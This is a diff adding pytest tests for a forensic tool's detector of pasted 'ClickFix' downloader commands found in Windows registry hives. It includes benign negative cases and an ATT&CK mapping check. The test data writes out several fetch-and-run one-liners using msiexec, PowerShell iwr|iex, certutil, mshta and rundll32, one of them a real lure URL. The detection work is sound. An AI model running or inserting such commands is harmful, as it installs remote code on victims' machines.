@@ -161,3 +161,57 @@ def test_real_hives_are_still_claimed(name):
     from inspecthor.parsers.plugins.registry_hive import RegistryHiveParser
 
     assert RegistryHiveParser().sniff(Path(name), b"regf\x00\x00\x00\x00") > 0.0
+
+
+# ---- pasted commands ---------------------------------------------------------
+
+# The real one, from a real collection. Backslashes after the scheme, mixed case,
+# and traversal padding built out of legitimate Windows directory names.
+REAL_LURE = (r"msiEXeC.exe -packaGE http:\\mkvn.us.com/system32/..\update/../"
+             r"winsxs/../UserID57426917 /Q")
+
+
+@pytest.mark.parametrize("text", [
+    REAL_LURE,
+    r"msiexec /i http://198.51.100.7/a.msi /qn",
+    r"mshta https://example.test/p.hta",
+    r"powershell -w h -c iwr http://example.test/a.ps1|iex",
+    r"certutil -urlcache -f http://example.test/x.exe x.exe",
+    r"rundll32 \\198.51.100.7\share\a.dll,Entry",
+])
+def test_pasted_downloader_is_flagged(text):
+    from inspecthor.parsers.plugins.registry_hive import _is_pasted_lure
+
+    assert _is_pasted_lure(text), text
+
+
+@pytest.mark.parametrize("text", [
+    "cmd", "explorer", "MRUList", r"\\fileserver\share", "https://intranet.local",
+    "msiexec /x {90140000-0011-0000-0000-0000000FF1CE}", "regedit", "mmc", "notepad",
+    r"C:\Users\me\Documents", "cmd /c dir",
+])
+def test_ordinary_typed_commands_are_not_flagged(text):
+    """A lone URL just opens a browser and a lone LOLBin is plausible. Requiring
+    both is what keeps this from becoming another 9,726-false-positive rule."""
+    from inspecthor.parsers.plugins.registry_hive import _is_pasted_lure
+
+    assert not _is_pasted_lure(text), text
+
+
+def test_the_backslash_scheme_spelling_is_not_missed():
+    """'http:\\host' is what a Windows path habit produces, and a naive 'http://'
+    check misses it. The real sample was spelled this way."""
+    from inspecthor.parsers.plugins.registry_hive import _is_pasted_lure
+
+    assert _is_pasted_lure(r"msiexec -package http:\\evil.test/a /Q")
+    assert _is_pasted_lure(r"msiexec -package http://evil.test/a /Q")
+
+
+def test_pasted_lure_maps_to_the_clickfix_technique():
+    """T1204.004 is 'Malicious Copy and Paste' and must resolve in the bundled DB,
+    since an unvalidated id is dropped and the finding loses its attribution."""
+    from inspecthor.attack import AttackDB
+
+    db = AttackDB()
+    assert db.valid(["T1204.004"]) == ["T1204.004"]
+    assert db.name_of("T1204.004") == "Malicious Copy and Paste"
